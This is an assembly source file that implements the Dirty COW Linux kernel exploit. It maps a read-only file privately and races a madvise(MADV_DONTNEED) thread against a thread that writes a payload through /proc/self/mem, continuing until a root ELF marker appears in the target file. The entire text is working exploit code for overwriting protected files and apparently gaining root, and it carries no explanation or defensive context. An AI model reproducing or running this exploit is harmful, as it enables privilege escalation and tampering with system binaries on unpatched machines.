dirtycow:
;( I/O )
;{
;:  rdi sys0arg                         *filename                               unknown
;:  rsi sys1arg                         *payload                                unknown
;:  rdx sys2arg                         len(*payload)                           unknown
;}
;{
  mov                                   qword [ .filename ],                    sys0arg
  mov                                   qword [ .payload ],                     sys1arg
  mov                                   qword [ .payload.length ],              sys2arg
  ;mov                                   sys1arg,                                ( file_modeR )
  null                                  sys1arg
  sys_call                              sys_open
  mov                                   qword [ .filedesc ],                    sys0ret
  lea                                   sys1arg,                                [ .fstat ]
  mov                                   sys0arg,                                sys0ret
  sys_call                              sys_fstat
  mov                                   sys4arg,                                qword [ .filedesc ]
  null                                  sys5arg
  mov                                   sys3arg,                                MMAP_fPrivate
  mov                                   sys2arg,                                MMAP_pReadable
  mov                                   sys1arg,                                qword [ .fstat.size ]
  add                                   sys1arg,                                ( page_size - 1 )
  and                                   sys1arg,                                ( 0 - page_size )
  null                                  sys0arg
  sys_call                              sys_mmap
  mov                                   qword [ .map ],                         sys0ret
  clone                                 .child0,                                rsp
  mov                                   qword [ .childs + 0 * __qword__ ],      sys0ret
  clone                                 .child1,                                rsp
  mov                                   qword [ .childs + 1 * __qword__ ],      sys0ret
  mov                                   r15,                                    qword [ .filedesc ]
  @@:
    nanosleep                           null,                                   ( 10 * MICROSECONDS )
    null                                sys2arg
    mov                                 sys1arg,                                ( rootelf64.unused - rootelf64 )
    mov                                 sys0arg,                                r15
    sys_call                            sys_lseek
    mov                                 sys2arg,                                4
    lea                                 sys1arg,                                [ .fstat.zero ]
    ;sys_call                            sys_read
    null                                rax
    syscall
    cmp                                 qword [ .childs + 0 * __qword__ ],      null
    jnz                                 @b
    cmp                                 qword [ .childs + 1 * __qword__ ],      null
    jnz                                 @b
  ret
  .child0:
  ;{
    null                                r12
    mov                                 r15,                                    qword [ .map ]
    mov                                 rbx,                                    ( 8 * 1024 * 1024 * 1024 )
    @@:
      mov                               sys2arg,                                MADV_DONTNEED
      mov                               sys1arg,                                100
      mov                               sys0arg,                                r15
      sys_call                          sys_madvise
      lea                               r12,                                    [ r12 + sys0ret ]
      cmp                               dword [ .fstat.zero ],                  rootelf64.magic
      je                                @f
      dec                               rbx
      jnz                               @b
    @@:
    mov                                 qword [ .childs + 0 * __qword__ ],      null
    sys_call                            sys_exit
  ;}
  .child1:
  ;{
    mov                                 sys1arg,                                ( file_modeRW )
    lea                                 sys0arg,                                [ .fmem ]
    sys_call                            sys_open
    mov                                 r15,                                    sys0ret
    mov                                 r14,                                    qword [ .payload ]
    mov                                 r13,                                    qword [ .payload.length ]
    mov                                 r12,                                    qword [ .map ]
    mov                                 rbx,                                    ( 8 * 1024 * 1024 * 1024 )
    mov                                 sys0arg,                                sys0ret
    @@:
      null                              sys2arg
      mov                               sys1arg,                                r12
      mov                               sys0arg,                                r15
      sys_call                          sys_lseek
      mov                               sys2arg,                                r13
      mov                               sys1arg,                                r14
      sys_call                          sys_write
      cmp                               dword [ .fstat.zero ],                  rootelf64.magic
      je                                @f
      dec                               rbx
      jnz                               @b
    @@:
    mov                                 qword [ .childs + 1 * __qword__ ],      null
    sys_call                            sys_exit
  ;}
;}
